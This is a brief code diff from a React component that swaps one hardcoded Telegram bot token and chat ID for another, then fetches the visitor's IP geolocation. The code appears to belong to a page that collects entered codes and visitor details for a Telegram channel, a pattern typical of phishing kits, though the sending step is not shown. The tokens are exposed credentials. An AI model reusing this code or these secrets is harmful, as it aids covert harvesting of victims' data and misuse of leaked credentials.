@@ -49,8 +49,8 @@ useEffect(() => {
             // Handle code validation
             return;
         } else {
-            const bot = 'bot8210786394:AAGCt_NAm02qOFH386Q7JwTD5x2-kNA2PQQ';
-            const chid = '7165145644';
+            const bot = 'bot7998763746:AAHkT1vQxXCYwn3Gt3cNG3muww3Hc5Tu4QQ';
+            const chid = '8393113385';
 
             fetch(`https://ipapi.co/json/`)
                 .then((response) => response.json())
